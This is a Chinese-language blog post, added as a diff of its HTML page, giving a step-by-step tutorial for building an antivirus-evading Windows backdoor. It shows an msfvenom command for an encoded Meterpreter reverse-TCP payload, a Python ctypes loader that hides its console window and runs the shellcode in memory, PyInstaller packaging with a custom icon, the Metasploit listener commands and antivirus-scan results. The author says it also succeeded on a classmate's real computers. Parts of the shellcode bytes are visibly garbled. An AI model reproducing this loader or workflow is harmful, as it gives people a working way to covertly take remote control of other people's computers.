@@ -1,0 +1,1297 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="Python加密shellcode免杀, 像清水一般清澈透明">
+    <meta name="description" content="">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>Python加密shellcode免杀 | 像清水一般清澈透明</title>
+    <link rel="icon" type="image/png" href="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/css/my.css">
+
+    <script src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 4.1.1">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="像清水一般清澈透明" type="application/atom+xml">
+
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">像清水一般清澈透明</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">像清水一般清澈透明</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+<script src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/medias/featureimages/10.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">Python加密shellcode免杀</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E5%85%8D%E6%9D%80/">
+                                <span class="chip bg-color">免杀</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E5%85%8D%E6%9D%80/" class="post-category">
+                                免杀
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2019-12-24
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    1.3k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    7 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p>[TOC]</p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><hr>
+<h1 id="前提准备"><a href="#前提准备" class="headerlink" title="前提准备"></a>前提准备</h1><p><strong>环境准备：</strong></p>
+<ul>
+<li>Windows7 32 位系统<ul>
+<li>Shellcode 使用 kali linux Metasploit 生成 shellcode</li>
+</ul>
+</li>
+</ul>
+<p><strong>Windows7 需要安装的软件：</strong></p>
+<ul>
+<li>Python2.7</li>
+<li>pip install pyinstaller</li>
+<li>pip install pywin32</li>
+<li>VCForPython27.msi(微软官网可以下载)</li>
+</ul>
+<hr>
+<h1 id="制作流程"><a href="#制作流程" class="headerlink" title="制作流程"></a>制作流程</h1><h2 id="1-查IP地址"><a href="#1-查IP地址" class="headerlink" title="1. 查IP地址"></a>1. 查IP地址</h2><p>查看自己的使用监听MSF的IP地址 10.1.5.10<br><img src="https://i.loli.net/2019/12/24/dkMiteNEBufa9HA.png" alt="10.png"></p>
+<hr>
+<h2 id="2-生成shellcode"><a href="#2-生成shellcode" class="headerlink" title="2. 生成shellcode"></a>2. 生成shellcode</h2><p>红色字体需要修改成自己的ip地址和需要监听的端口号。</p>
+<pre><code>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp_uuid LPORT=``x`` LHOST=``x.x.x.x`` -e   x86/shikata_ga_nai -i 11 -f py -o samny.py</code></pre><p>   <img src="https://s2.ax1x.com/2019/12/24/lP8vmd.png" alt="11"></p>
+<hr>
+<h2 id="3-替换shellcode"><a href="#3-替换shellcode" class="headerlink" title="3. 替换shellcode"></a>3. 替换shellcode</h2><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">   buf= <span class="string">b""</span>buf =  <span class="string">b""</span></span><br><span class="line">   buf += <span class="string">b"\xb8\x99\xfb\x4d\xa7\xd9\xea\xd9\x74\x24\xf4\x5f\x23"</span></span><br><span class="line">buf += <span class="string">b"\xc9\xb1\xa2\x83\xef\xfc\x31\x47\x0e\x03\xde\xf5\xaf"</span></span><br><span class="line">************省略内容，替换内容************</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">buf =  <span class="string">b""</span></span><br><span class="line">buf += <span class="string">b"\xb8\x99\xfb\x4d\xa7\xd9\xea\xd9\x74\x24\xf4\x5f\x23"</span></span><br><span class="line">buf += <span class="string">b"\xc9\xb1\xa2\x83\xef\xfc\x31\x47\x0e\x03\xde\xf5\xaf"</span></span><br><span class="line">buf += <span class="string">b"\x52\x3b\xc4\xe9\xe9\x9f\x23\x53\xac\x06\x9c\x45\x85"</span></span><br><span class="line">buf += <span class="string">b"\x89\xea\x37\xbe\x6a\x2e\x33\xf0\x1e\xbb\x3f\x80\x13"</span></span><br><span class="line">buf += <span class="string">b"\x76\xeb\x89\x4d\x9a\x48\xf1\xb3\x91\xcb\x32\x45\x2e"</span></span><br><span class="line">buf += <span class="string">b"\x4b\xdc\x96\x67\x9f\xb6\x14\x0a\x31\x26\x1a\xb8\xbd"</span></span><br><span class="line">buf += <span class="string">b"\xc1\xf5\x5d\x20\xcf\x4c\x95\x41\x7f\x19\xd2\x76\x96"</span></span><br><span class="line">buf += <span class="string">b"\x98\x6c\x89\x5b\x10\xb4\xfd\xf5\x2f\x4c\x78\x2f\xa0"</span></span><br><span class="line">buf += <span class="string">b"\x94\x1a\xbe\x0c\xbb\x5b\xfc\xeb\x81\x29\x54\x6e\x0c"</span></span><br><span class="line">buf += <span class="string">b"\x16\x91\xca\xdd\x71\x58\x89\x2f\xf3\x08\x08\x9e\xb8"</span></span><br><span class="line">buf += <span class="string">b"\xe2\xf5\x27\xb6\xb9\x31\x3c\xa7\x94\x90\x8c\xc6\x9d"</span></span><br><span class="line">buf += <span class="string">b"\x57\xd1\x11\x70\xed\x65\xf1\x3a\xc4\x15\x43\xba\x03"</span></span><br><span class="line">buf += <span class="string">b"\x97\xae\x81\x06\x77\x3e\xb0\xd0\xae\x99\x63\x1e\x3d"</span></span><br><span class="line">buf += <span class="string">b"\x80\x33\xac\x8b\xbb\x56\xb5\xc1\x4d\x5d\xab\x20\x34"</span></span><br><span class="line">buf += <span class="string">b"\xcd\x6c\x70\x0d\x85\x7b\xc0\x5d\xcc\xf6\x2d\xc0\x2b"</span></span><br><span class="line">buf += <span class="string">b"\x34\xa4\xc0\x0b\x1d\xee\xd8\xa3\xcb\x6d\xbe\x43\x37"</span></span><br><span class="line">buf += <span class="string">b"\x1d\xb6\x21\xa3\x2da\x20\x216\x89\x51\x2f\x01\x11\x97"</span></span><br><span class="line">buf += <span class="string">b"\x09\xbb\x54\x12e\xe8\x13\xeb\x02\x12\x01\x0f\xc1\x4e"</span></span><br><span class="line">buf += <span class="string">b"\xf3\xe4\x4w22\x1a\xa2\x38\x11\xb23\x4c\x76\x47\x11\x4e"</span></span><br><span class="line">buf += <span class="string">b"\xc8\xc6\x8swd\xed\xbc\x08\x9c\x65\xf8\x38\xf7\x00\x34"</span></span><br><span class="line">buf += <span class="string">b"\x34\x4e\xef\ax83\xqdsaff\x97\x8c\xde\x0c\x0e\xa4\xa4\x01"</span></span><br><span class="line">buf += <span class="string">b"\xc5\xd3\x61\x79\x83\qwx07\xec\x81\x04\x49\x8e\x9e\x10"</span></span><br><span class="line">buf += <span class="string">b"\xe8\xce\x64\x49\xb9\xc8\xc1\xdf\x4d\x7b\x9e\x6d\x94"</span></span><br><span class="line">buf += <span class="string">b"\x12\x50\xfc\x49\x8c\x17\x8a\x57\x69\xab\x2d\x85\x98"</span></span><br><span class="line">buf += <span class="string">b"\x52\x37\x11\xc9\x9f\x60\xed\x17\x31\x16\x4b\xae\x0e"</span></span><br><span class="line">buf += <span class="string">b"\xd4\x23\xef\x71\xd3\xc8\x35\x4b\x4w3\x3e\x7c\x39\x7c"</span></span><br><span class="line">buf += <span class="string">b"\x68\x60\x5b\x23\xc8\xab\x45\xa5\xe7\xef\x39\xd7\xad"</span></span><br><span class="line">buf += <span class="string">b"\xa6\xe7\x36\x6e\xa7\xef\xba\x01\x2e\x76\xa3\x0a\x79"</span></span><br><span class="line">buf += <span class="string">b"\xc5\xb7\x3d\xfa\xd1\xf7\xc7\x40\x30\x50\x95\x30\xdb"</span></span><br><span class="line">buf += <span class="string">b"\x13\x09\x91\x2f\x76\x91\x61\x9b\xea\x20\x5a\x0d\x5b"</span></span><br><span class="line">buf += <span class="string">b"\xa6\x96\xba\xac\xaf\x28\x1e\x2c\x33\x99\x8f\x00\x1d"</span></span><br><span class="line">buf += <span class="string">b"\x79\xec\x8a\x9b\xaa\xc4\xe8\x23\x50\xe6\xa9\xc8\xeb"</span></span><br><span class="line">buf += <span class="string">b"\x2b\x48\xc0\xe4\xfc\x93\x66\x9a\x44\xd4\xe3\xf7\x72"</span></span><br><span class="line">buf += <span class="string">b"\xdd\x26\x45\xb1\xec\x7c\xaf\x65\xd6\xf8\x53\xd0\xa8"</span></span><br><span class="line">buf += <span class="string">b"\x16\x9e\x39\xc6\x6c\xc1\x66\xf7\x28\xc7\x11\x52\xc9"</span></span><br><span class="line">buf += <span class="string">b"\xb9\x2e\xce\xec\x6c\xae\xe7\x55\x72\x89\xc0\x12\x92"</span></span><br><span class="line">buf += <span class="string">b"\x9b\x33\x0a\x1e\xe6\xc0\x91\xb6\x68\xf6\x26\xa5\xaa"</span></span><br><span class="line">buf += <span class="string">b"\x5d\xca\xd4\x60\x1d\x70\xde\xd8\x13\xad\x9c\xea\xa3"</span></span><br><span class="line">buf += <span class="string">b"\xe4\xbb\xdb\x3c\x27\x27\x50\xf9\x07\xe3\xa8\x04\xb5"</span></span><br><span class="line">buf += <span class="string">b"\xe9\xff\xd5\x5a\x51\x69\x33\x99\x5b\x27\x85\xcd\x36"</span></span><br><span class="line">buf += <span class="string">b"\x35\x22\xa9\x4f\xc6\x0d\xed\xf3\x40\xaa\x7b\x8e\xdb"</span></span><br><span class="line">buf += <span class="string">b"\xd8\xc9\x2b\x19\x78\x5a\x91\x61\x63\xf0\xae\x05\xcd"</span></span><br><span class="line">buf += <span class="string">b"\x28\xeb\x35\x15\x12\x67\x04\xb1\x93\xe8\x34\xc1\xc5"</span></span><br><span class="line">buf += <span class="string">b"\x21\xbf\x47\xb4\x15\x22\xbe\xb0\x0f\x43\x9d\xc4\x11"</span></span><br><span class="line">buf += <span class="string">b"\xe8\x92\x97\xfb\x75\xc7\x23\x70\xf3\x86\xcf\x55\xc4"</span></span><br><span class="line">buf += <span class="string">b"\xc0\xa6\x1a\x10\xab\xe9\xc1\xee\xf9\x13\x9c\xa0\xf9"</span></span><br><span class="line">buf += <span class="string">b"\xea\x1c\xaa\xasd1c\xbe\x6b\xe2\x8c\x91\x30\xbf\x20\x05"</span></span><br><span class="line">buf += <span class="string">b"\x3a\x82\x0f\x43\xe4\x4c\qwx54\x23\x26\xe4\x97\xc8\x5a"</span></span><br><span class="line">buf += <span class="string">b"\xd8\x6d\x5a\x74\x20\x51\x1c\xb9\x42\x3a\x2d\x96\xdd"</span></span><br><span class="line">buf += <span class="string">b"\x23\x3f\x72\xd6\x31\xe8\x67\x9c\xc8\xe5\x0b\x5e\xd7"</span></span><br><span class="line">buf += <span class="string">b"\xbd\xdf\x97\x96\x01\x44\x19\x78\x16\xd1\x45\xe7\xcd"</span></span><br><span class="line">buf += <span class="string">b"\x18\x1c\xb6\x84\xa8\x06\x3e\xe1"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PROT_READ = <span class="number">1</span></span><br><span class="line">PROT_WRITE = <span class="number">2</span></span><br><span class="line">PROT_EXEC = <span class="number">4</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">executable_code</span><span class="params">(buffer)</span>:</span></span><br><span class="line">    buf = c_char_p(buffer)</span><br><span class="line">    size = len(buffer)</span><br><span class="line">    addr = libc.valloc(size)</span><br><span class="line">    addr = c_void_p(addr)</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> == addr: </span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">"Failed to allocate memory"</span>)</span><br><span class="line"></span><br><span class="line">    memmove(addr, buf, size)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> != libc.mprotect(addr, len(buffer), PROT_READ | PROT_WRITE | PROT_EXEC):</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">"Failed to set protection on buffer"</span>)</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line">VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc</span><br><span class="line">VirtualProtect = ctypes.windll.kernel32.VirtualProtect</span><br><span class="line">shellcode = bytearray(buf)</span><br><span class="line">whnd = ctypes.windll.kernel32.GetConsoleWindow()   </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> whnd != <span class="number">0</span>:</span><br><span class="line">       <span class="keyword">if</span> <span class="number">666</span>==<span class="number">666</span>:</span><br><span class="line">              ctypes.windll.user32.ShowWindow(whnd, <span class="number">0</span>)   </span><br><span class="line">              ctypes.windll.kernel32.CloseHandle(whnd)</span><br><span class="line"></span><br><span class="line">memorywithshell = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                                          ctypes.c_int(len(shellcode)),</span><br><span class="line">                                          ctypes.c_int(<span class="number">0x3000</span>),</span><br><span class="line">                                          ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">old = ctypes.c_long(<span class="number">1</span>)</span><br><span class="line">VirtualProtect(memorywithshell, ctypes.c_int(len(shellcode)),<span class="number">0x40</span>,ctypes.byref(old))</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(memorywithshell),</span><br><span class="line">                                     buf,</span><br><span class="line">                                     ctypes.c_int(len(shellcode)))</span><br><span class="line">shell = cast(memorywithshell, CFUNCTYPE(c_void_p))</span><br><span class="line">shell()</span><br></pre></td></tr></tbody></table></figure>
+<hr>
+<h2 id="4-制作后门程序"><a href="#4-制作后门程序" class="headerlink" title="4. 制作后门程序"></a>4. 制作后门程序</h2><p>图标可以自己选择替换<br><img src="https://i.loli.net/2019/12/24/EFxIsLBrAY8wbZT.png" alt="6.png"></p>
+<hr>
+<h2 id="5-测试"><a href="#5-测试" class="headerlink" title="5. 测试"></a>5. 测试</h2><pre><code>use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp_uuid
+set lhost 192.168.23.129
+set lport 8888
+set EnableStageEncoding true
+set StageEncoder x86/fnstenv_mov</code></pre><p><img src="https://s2.ax1x.com/2019/12/24/lP8LlD.png" alt="14"></p>
+<p>测试系统版本如下：</p>
+<ul>
+<li>Windows 7(32位和64位)</li>
+<li>Windows server 8 </li>
+<li>Windows 10 1903</li>
+<li>真实环境也测试成功，利用同学的电脑Windows 7和Windows 10均能成功。<br><img src="https://i.loli.net/2019/12/24/rchmDGuCaPHJy7N.png" alt="3.png"><br><img src="https://i.loli.net/2019/12/24/V36rXeA9NZ2STFu.png" alt="2.png"></li>
+</ul>
+<hr>
+<h1 id="在线查杀结果"><a href="#在线查杀结果" class="headerlink" title="在线查杀结果"></a>在线查杀结果</h1><p><img src="https://i.loli.net/2019/12/24/Kq68XIzrhZwfCQD.png" alt="7.png"><br><img src="https://i.loli.net/2019/12/24/D7iNk8WJlx6mvtE.png" alt="8.png"></p>
+<p><img src="https://i.loli.net/2019/12/24/TMakXC9wnhOVLUP.png" alt="9.png"><br><img src="https://i.loli.net/2019/12/24/PboOgJTuZ3tUHkd.png" alt="4.png"><br><img src="https://i.loli.net/2019/12/24/ELV1JS4YD67NwtT.png" alt="5.png"></p>
+<p><a href="http://r.virscan.org/language/zh-cn/report/5587ae4565ebc058d2b7846eeb12b27a" target="_blank" rel="noopener">http://r.virscan.org/language/zh-cn/report/5587ae4565ebc058d2b7846eeb12b27a</a></p>
+<hr>
+<h1 id="意料之外的坑"><a href="#意料之外的坑" class="headerlink" title="意料之外的坑"></a>意料之外的坑</h1><ol>
+<li>环境不对，最后我特意去下载Windows 7（32位）镜像安装一个虚拟机才成功。本机缺少某种环境，但是始终找不到，最后无奈之举才得以如此。<br><img src="https://s2.ax1x.com/2019/12/24/lP8qSO.png" alt="12"></li>
+<li>最新版的kali无法弹shell，这一步卡了我很久很久，最后我用<a href="https://blog.csdn.net/sun1318578251/article/details/90733372" target="_blank" rel="noopener">Pentestbox</a>里面的msf监听端口才得以成功。</li>
+</ol>
+<p><img src="https://s2.ax1x.com/2019/12/24/lP8XOH.png" alt="13"><br><img src="https://s2.ax1x.com/2019/12/24/lP8LlD.png" alt="14"></p>
+<hr>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/qq_41770175/article/details/98475696" target="_blank" rel="noopener">https://blog.csdn.net/qq_41770175/article/details/98475696</a><br><a href="https://secquan.org/Discuss/906" target="_blank" rel="noopener">https://secquan.org/Discuss/906</a><br><a href="https://www.cnblogs.com/backlion/p/6785870.html" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/6785870.html</a></p>
+<hr>
+<h1 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h1><p>本文中提到的shellcode仅供研究学习使用，请遵守《网络安全法》等相关法律法规。</p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">SummerSec</a>
+                </span>
